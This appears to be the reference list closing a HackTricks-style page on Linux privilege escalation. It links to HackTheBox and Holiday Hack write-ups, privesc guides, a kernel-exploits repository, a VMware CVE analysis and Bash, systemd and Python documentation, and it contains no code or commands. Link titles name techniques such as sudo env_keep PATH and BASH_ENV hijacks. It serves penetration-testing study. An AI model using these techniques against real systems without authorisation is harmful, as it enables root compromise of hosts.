- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../../banners/hacktricks-training.md}}
